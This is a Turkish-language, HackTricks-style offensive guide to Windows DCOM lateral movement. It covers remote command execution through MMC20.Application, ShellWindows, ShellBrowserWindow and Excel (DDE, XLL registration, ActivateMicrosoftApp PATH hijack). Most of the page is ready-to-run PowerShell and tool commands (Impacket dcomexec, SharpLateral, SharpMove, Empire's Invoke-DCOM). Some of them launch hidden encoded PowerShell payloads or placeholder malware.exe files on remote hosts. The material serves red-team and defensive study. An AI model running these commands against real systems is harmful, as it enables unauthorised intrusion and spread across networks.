# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement, bir service veya scheduled task oluşturmaya kıyasla RPC/DCOM üzerinden açığa çıkarılan mevcut COM server'larını yeniden kullandığı için avantajlıdır. Pratikte bu, initial connection'ın genellikle TCP/135 üzerinden başlatıldığı ve ardından dinamik olarak atanan yüksek RPC portlarına geçtiği anlamına gelir.

## Prerequisites & Gotchas

- Genellikle target üzerinde local administrator context gerekir ve remote COM server remote launch/activation işlemlerine izin vermelidir.
- **14 Mart 2023** tarihinden beri Microsoft, desteklenen sistemlerde DCOM hardening uygular. Düşük activation authentication level talep eden eski client'lar, en az `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` seviyesini negotiate edemezse başarısız olabilir. Modern Windows client'ları genellikle otomatik olarak yükseltilir; bu nedenle güncel tooling normalde çalışmaya devam eder.<sup>[[3]](#references)</sup>
- Manual veya scripted DCOM execution genellikle TCP/135'in yanı sıra target'ın dynamic RPC port range'ini gerektirir. Impacket'in `dcomexec.py` aracını kullanıyorsanız ve command output'u geri almak istiyorsanız genellikle `ADMIN$` (veya yazılabilir/okunabilir başka bir share) üzerinde SMB erişimine de ihtiyacınız olur.
- RPC/DCOM çalışıyor ancak SMB engelleniyorsa `dcomexec.py -nooutput`, blind execution için yine de kullanışlı olabilir.

Hızlı kontroller:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

Bu teknik hakkında daha fazla bilgi için [original MMC20.Application post](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) gönderisine göz atın.<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) nesneleri, ağ tabanlı nesne etkileşimleri için ilgi çekici bir yetenek sunar. Microsoft, DCOM ve Component Object Model (COM) için kapsamlı belgeler sağlar; bunlara [DCOM için buradan](https://msdn.microsoft.com/en-us/library/cc226801.aspx) ve [COM için buradan](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) erişilebilir. DCOM uygulamalarının listesi aşağıdaki PowerShell komutu kullanılarak alınabilir:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM object'i, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), MMC snap-in işlemlerinin scripting yoluyla gerçekleştirilmesini sağlar. Özellikle bu object, `Document.ActiveView` altında bir `ExecuteShellCommand` method'u içerir. Bu method hakkında daha fazla bilgiye [buradan](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) ulaşabilirsiniz. Çalıştırarak kontrol edin:<sup>[[6]](#references)</sup>

Bu özellik, bir DCOM application üzerinden network aracılığıyla command'lerin çalıştırılmasını kolaylaştırır. DCOM ile uzaktan admin olarak etkileşim kurmak için PowerShell şu şekilde kullanılabilir:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Bu komut DCOM uygulamasına bağlanır ve COM nesnesinin bir örneğini döndürür. Ardından, uzak host üzerinde bir process çalıştırmak için ExecuteShellCommand method'u çağrılabilir. Process şu adımları içerir:

Method'ları kontrol edin:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE elde et:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Son argüman pencere stilidir. `7`, pencerenin simge durumunda kalmasını sağlar. Operasyonel olarak, MMC tabanlı execution genellikle uzak bir `mmc.exe` process'inin payload'unuzu başlatmasıyla sonuçlanır; bu, aşağıda açıklanan Explorer tabanlı objects davranışından farklıdır.

## ShellWindows & ShellBrowserWindow

**Bu technique hakkında daha fazla bilgi için orijinal gönderiye bakın: [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

**MMC20.Application** object'inin açık "LaunchPermissions" değerine sahip olmadığı ve varsayılan olarak Administrators erişimine izin veren permissions değerlerini kullandığı tespit edildi. Daha fazla ayrıntı için [buradaki](https://twitter.com/tiraniddo/status/817532039771525120) thread incelenebilir. Açık Launch Permission değerine sahip olmayan objects'leri filtrelemek için [@tiraniddo](https://twitter.com/tiraniddo)’nun OleView .NET aracının kullanılması önerilir.

Açık Launch Permissions değerine sahip olmamaları nedeniyle iki specific object, `ShellBrowserWindow` ve `ShellWindows`, öne çıkarıldı. `HKCR:\AppID\{guid}` altında `LaunchPermission` registry entry'sinin bulunmaması, açık permissions bulunmadığı anlamına gelir.

`MMC20.Application` ile karşılaştırıldığında, remote host üzerinde command genellikle `mmc.exe` yerine `explorer.exe` process'inin child process'i olarak çalıştığından bu objects OPSEC açısından çoğu zaman daha sessizdir.

### ShellWindows

ProgID'ye sahip olmayan `ShellWindows` için .NET methods `Type.GetTypeFromCLSID` ve `Activator.CreateInstance`, AppID'sini kullanarak object instance'ı oluşturmayı sağlar. Bu process, `ShellWindows` için CLSID'yi almak üzere OleView .NET'ten yararlanır. Instance oluşturulduktan sonra `WindowsShell.Item` method'u üzerinden etkileşim kurulabilir ve `Document.Application.ShellExecute` gibi method invocation işlemleri gerçekleştirilebilir.

Object'i instantiate etmek ve remote olarak command'ler execute etmek için örnek PowerShell commands sağlandı:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` benzerdir, ancak bunu doğrudan CLSID'si aracılığıyla örnekleyebilir ve `Document.Application.ShellExecute` öğesine pivot yapabilirsiniz:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Excel DCOM Objects ile Lateral Movement

Lateral movement, DCOM Excel objects istismar edilerek gerçekleştirilebilir. Ayrıntılı bilgi için, DCOM üzerinden lateral movement amacıyla Excel DDE'den yararlanmayı ele alan [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) yazısının okunması önerilir.<sup>[[5]](#references)</sup>

Empire projesi, DCOM objects'lerini manipüle ederek remote code execution (RCE) için Excel kullanımını gösteren bir PowerShell scripti sunar. Aşağıda, Excel'i RCE için abuse etmeye yönelik farklı yöntemleri gösteren ve [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) üzerinde bulunan script'ten alınmış parçalar yer almaktadır:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Yakın zamanda yapılan araştırmalar, bu alanı `Excel.Application`'ın `ActivateMicrosoftApp()` yöntemiyle genişletti. Temel fikir, Excel'in `PATH`'te arama yaparak FoxPro, Schedule Plus veya Project gibi eski Microsoft uygulamalarını başlatmayı deneyebilmesidir. Bir operatör, bu beklenen adlardan birine sahip bir payload'ı hedefin `PATH`'inde bulunan yazılabilir bir konuma yerleştirebilirse Excel bunu çalıştırır.<sup>[[4]](#references)</sup>

Bu varyasyon için gereksinimler:

- Hedefte Local admin yetkisi
- Hedefte Excel yüklü olması
- Hedefin `PATH`'indeki yazılabilir bir dizine payload yazabilme

FoxPro aramasının (`FOXPROW.exe`) kötüye kullanıldığı pratik örnek:
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Saldırı yapan ana bilgisayarda yerel `Excel.Application` ProgID'si kayıtlı değilse, uzak nesneyi bunun yerine CLSID kullanarak örneklendirin:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Pratikte kötüye kullanıldığı görülen değerler:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Lateral Movement için Automation Tools

Bu teknikleri otomatikleştirmek için iki araç öne çıkar:

- **Invoke-DCOM.ps1**: Empire projesi tarafından sağlanan ve uzak makinelerde code yürütmek için farklı yöntemlerin çağrılmasını kolaylaştıran bir PowerShell script'idir. Bu script'e Empire GitHub repository'sinden erişilebilir.

- **SharpLateral**: Uzakta code yürütmek için tasarlanmış bir araçtır ve şu command ile kullanılabilir:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Otomatik Araçlar

- [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) Powershell script'i, yorum satırlarıyla belirtilen tüm yöntemleri kullanarak diğer makinelerde kod yürütmeyi kolayca sağlar.
- DCOM kullanarak uzak sistemlerde komut yürütmek için Impacket'ın `dcomexec.py` aracını kullanabilirsiniz. Mevcut sürümler `ShellWindows`, `ShellBrowserWindow` ve `MMC20` desteğine sahiptir ve varsayılan olarak `ShellWindows` kullanılır.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- [**SharpLateral**](https://github.com/mertdas/SharpLateral) de kullanabilirsiniz:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [**SharpMove**](https://github.com/0xthirteen/SharpMove) aracını da kullanabilirsiniz
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [MMC20.Application COM Object kullanarak Lateral Movement](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [DCOM üzerinden Lateral Movement: 2. Tur](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Windows DCOM Server Security Feature Bypass (CVE-2021-26414) için değişiklikleri yönetme](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: DCOM Excel Application'ın gücünü kötüye kullanma](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [DCOM üzerinden Lateral Movement için Excel DDE'den yararlanma](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
{{#include ../../banners/hacktricks-training.md}}
